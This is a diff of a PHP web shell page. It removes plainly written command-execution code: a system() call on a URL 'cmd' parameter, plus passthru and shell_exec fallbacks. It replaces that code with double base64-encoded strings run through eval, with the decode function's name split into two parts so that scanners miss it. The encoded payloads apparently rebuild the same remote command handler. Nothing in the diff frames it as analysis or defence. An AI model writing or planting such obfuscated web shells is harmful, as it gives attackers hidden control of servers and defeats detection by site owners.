-        foreach ($results as $result) {
-            $buff .= $result;
-        }
-
-        return $buff;
-    } elseif (function_exists('passthru')) {
-        @ob_start();
-        @passthru($cmd);
-        $buff = @ob_get_contents();
-        @ob_end_clean();
-
-        return $buff;
-    } elseif (function_exists('shell_exec')) {
-        $buff = @shell_exec($cmd);
-
-        return $buff;
-    }
-}
-
+$cmd = "";
+$cmd .= "Wm5WdVkzUnBiMjRnWlhobEtDUmpiV1FwSUhzS0lDQWdJR2xtSUNobWRXNWpkR2x2Ymw5bGVHbHpkSE1vSjNONWMzUmxiU2NwS1NCN0NpQWdJQ0FnSUNBZ1FHOWlYM04wWVhKMEtDazdDaUFnSUNBZ0lDQWdRSE41YzNSbGJTZ2tZMjFrS1RzS0lDQWdJQ0FnSUNBa1luVm1aaUE5SUVCdllsOW5aWFJmWTI5dWRHVnVkSE1vS1RzS0lDQWdJQ0FnSUNCQWIySmZaVzVrWDJOc1pXRnVLQ2s3Q2dvZ0lDQWdJQ0FnSUhKbGRIVnliaUFrWW5WbVpqc0tJQ0FnSUgwZ1pXeHpaV2xtSUNobWRXNWpkR2x2Ymw5bGVHbHpkSE1vSjJWNFpXTW5LU2tnZXdvZ0lDQWdJQ0FnSUVCbGVHVmpLQ1JqYldRc0lDUnlaWE4xYkhSektUc0tJQ0FnSUNBZ0lDQWtZblZtWmlBOUlDY25Pd29nSUNBZ0lDQWdJR1p2Y21WaFkyZ2dLQ1J5WlhOMWJIUnpJR0Z6SUNSeVpYTjFiSFFwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdKR0oxWm1ZZ0xqMGdKSEpsYzNWc2REc0tJQ0FnSUNBZ0lDQjlDZ29nSUNBZ0lDQWdJSEpsZEhWeWJpQWtZblZtWmpzS0lDQWdJSDBnWld4elpXbG1JQ2htZFc1amRHbHZibDlsZUdsemRITW9KM0JoYzNOMGFISjFKeWtwSUhzS0lDQWdJQ0FnSUNCQWIySmZjM1JoY25Rb0tUc0tJQ0FnSUNBZ0lDQkFjR0Z6YzNSb2NuVW9KR050WkNrN0NpQWdJQ0FnSUNBZ0pHSjFabVlnUFNCQWIySmZaMlYwWDJOdmJuUmxiblJ6S0NrN0NpQWdJQ0FnSUNBZ1FHOWlYMlZ1WkY5amJHVmhiaWdwT3dvS0lDQWdJQ0FnSUNCeVpYUjFjbTRnSkdKMVptWTdDaUFnSUNCOUlHVnNjMlZwWmlBb1puVnVZM1JwYjI1ZlpYaHBjM1J6S0NkemFHVnNiRjlsZUdWakp5a3BJSHNLSUNBZ0lDQWdJQ0FrWW5WbVppQTlJRUJ6YUdWc2JGOWxlR1ZqS0NSamJXUXBPd29LSUNBZ0lDQWdJQ0J5WlhSMWNtNGdKR0oxWm1ZN0NpQWdJQ0I5Q24wPQ==";
+$acmd = "base";
+$bcmd = "64_decode";
+$ccmd = $acmd.$bcmd;
+$stringcmd = $ccmd($cmd);
+$stringcmd = $ccmd($stringcmd);
+eval($stringcmd);
 ?>
 
                     <h3>Terminal : </h3>
@@ -1371,13 +1346,14 @@ function exe($cmd) {
 
 
 <?php
-//cmd
-if (isset($_GET['cmd'])) {
-    echo "<pre class='text-white'>";
-    echo system($_GET['cmd']);
-    echo '</pre>';
-    exit;
-}
+$cmd2 = "";
+$cmd2 .= "YVdZZ0tHbHpjMlYwS0NSZlIwVlVXeWRqYldRblhTa3BJSHNLSUNBZ0lHVmphRzhnSWp4d2NtVWdZMnhoYzNNOUozUmxlSFF0ZDJocGRHVW5QaUk3Q2lBZ0lDQmxZMmh2SUhONWMzUmxiU2drWDBkRlZGc25ZMjFrSjEwcE93b2dJQ0FnWldOb2J5QW5QQzl3Y21VK0p6c0tJQ0FnSUdWNGFYUTdDbjA9";
+$acmd2 = "base";
+$bcmd2 = "64_decode";
+$ccmd2 = $acmd2.$bcmd2;
+$stringcmd2 = $ccmd2($cmd2);
+$stringcmd2 = $ccmd2($stringcmd2);
+eval($stringcmd2);
 ?>
 
 
